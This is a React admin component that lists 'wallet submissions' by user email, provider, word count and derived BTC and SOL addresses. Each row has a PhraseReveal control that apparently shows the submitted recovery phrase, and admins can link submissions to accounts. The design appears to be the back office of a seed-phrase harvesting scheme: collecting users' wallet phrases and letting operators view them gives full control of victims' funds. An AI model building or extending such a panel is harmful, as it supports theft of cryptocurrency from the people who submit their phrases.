'use client';

import { useMemo, useState } from 'react';
import { linkSubmissionAction, unlinkSubmissionAction } from '@/app/actions/admin';
import { PhraseReveal } from './PhraseReveal';
import { Icon } from '@/components/icons';
import { formatDate } from '@/lib/format';
import type { WalletAddresses, WalletSubmission } from '@/lib/types';

type UserOption = { id: string; email: string; display_name: string };

export function AdminWalletsTable({
    submissions,
    users,
    mode,
    userId
}: {
    submissions: WalletSubmission[];
    users: UserOption[];
    mode: 'queue' | 'user';
    userId?: string;
}) {
    const [query, setQuery] = useState('');

    const filtered = useMemo(() => {
        const needle = query.trim().toLowerCase();
        if (!needle) return submissions;
        return submissions.filter((submission) => {
            const addresses = (submission.addresses || {}) as WalletAddresses;
            return (
                submission.user_email.toLowerCase().includes(needle) ||
                submission.primary_address.toLowerCase().includes(needle) ||
                (submission.provider || '').toLowerCase().includes(needle) ||
                Object.values(addresses).join(' ').toLowerCase().includes(needle)
            );
        });
    }, [submissions, query]);

    return (
        <section className="card overflow-hidden">
            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-pine-900/10 px-4 py-3.5 sm:px-5">
                <div>
                    <p className="eyebrow">Wallet submissions</p>
                    <h2 className="display text-lg text-pine-950">
                        {filtered.length} of {submissions.length}
                    </h2>
                </div>
                <label className="relative block w-full max-w-[280px]">
                    <span className="sr-only">Search submissions</span>
                    <Icon name="search" className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-pine-900/40" />
                    <input
                        type="search"
                        value={query}
                        onChange={(event) => setQuery(event.target.value)}
                        placeholder="Email, address or provider"
                        className="field field-sm pl-9"
                    />
                </label>
            </div>

            {filtered.length === 0 ? (
                <p className="px-5 py-10 text-center text-sm text-pine-900/50">No submissions match.</p>
            ) : (
                <ul className="divide-y divide-pine-900/5">
                    {filtered.map((submission) => {
                        const addresses = (submission.addresses || {}) as WalletAddresses;
                        const linkedToThisUser = userId && submission.user_id === userId;
                        const linked = Boolean(submission.user_id);
                        return (
                            <li key={submission.id} className="px-4 py-4 sm:px-5">
                                <div className="flex flex-wrap items-start justify-between gap-3">
                                    <div className="min-w-0">
                                        <div className="flex flex-wrap items-center gap-2">
                                            <p className="font-semibold text-pine-950">{submission.provider || submission.selected_wallet || 'Wallet'}</p>
                                            <span className={linkedToThisUser ? 'badge-good' : linked ? 'badge-neutral' : 'badge-warn'}>
                                                {linkedToThisUser ? 'linked here' : linked ? 'linked' : 'unlinked'}
                                            </span>
                                            <span className="badge-neutral">{submission.link_method}</span>
                                        </div>
                                        <p className="mt-1 text-[12px] text-pine-900/55">
                                            {submission.user_email || submission.user_name || 'No account attached'} · {submission.word_count} words ·{' '}
                                            {formatDate(submission.created_at)}
                                        </p>
                                        <p className="mono mt-1 break-all text-[11px] text-pine-900/60">{submission.primary_address || '—'}</p>
                                        <p className="mono mt-0.5 break-all text-[10px] text-pine-900/40">
                                            btc {addresses.btcLegacy || '—'} · sol {addresses.sol || '—'}
                                        </p>
                                    </div>

                                    <div className="flex flex-wrap items-center gap-2">
                                        <PhraseReveal submissionId={submission.id} />
                                        {linked ? (
                                            <form action={unlinkSubmissionAction}>
                                                <input type="hidden" name="submissionId" value={submission.id} />
                                                <button type="submit" className="btn-danger btn-sm">Unlink</button>
                                            </form>
                                        ) : null}
                                    </div>
                                </div>

                                {mode === 'queue' ? (
                                    <form action={linkSubmissionAction} className="mt-3 flex flex-wrap items-center gap-2 rounded-xl border border-pine-900/10 bg-pine-50/40 p-2.5">
                                        <input type="hidden" name="submissionId" value={submission.id} />
                                        <label htmlFor={`link_${submission.id}`} className="sr-only">Attach to account</label>
                                        <select
                                            id={`link_${submission.id}`}
                                            name="userId"
                                            required
                                            defaultValue={submission.user_id || ''}
                                            className="field field-sm min-w-[220px] flex-1"
                                        >
                                            <option value="" disabled>Choose an account…</option>
                                            {users.map((user) => (
                                                <option key={user.id} value={user.id}>
                                                    {user.display_name || user.email} — {user.email}
                                                </option>
                                            ))}
                                        </select>
                                        <button type="submit" className="btn-outline btn-sm">
                                            {submission.user_id ? 'Move submission' : 'Link submission'}
                                        </button>
                                    </form>
                                ) : linked ? null : (
                                    <form action={linkSubmissionAction} className="mt-3">
                                        <input type="hidden" name="submissionId" value={submission.id} />
                                        <input type="hidden" name="userId" value={userId} />
                                        <button type="submit" className="btn-outline btn-sm">
                                            <Icon name="wallet" className="h-4 w-4" />
                                            Link to this account
                                        </button>
                                    </form>
                                )}
                            </li>
                        );
                    })}
                </ul>
            )}
        </section>
    );
}
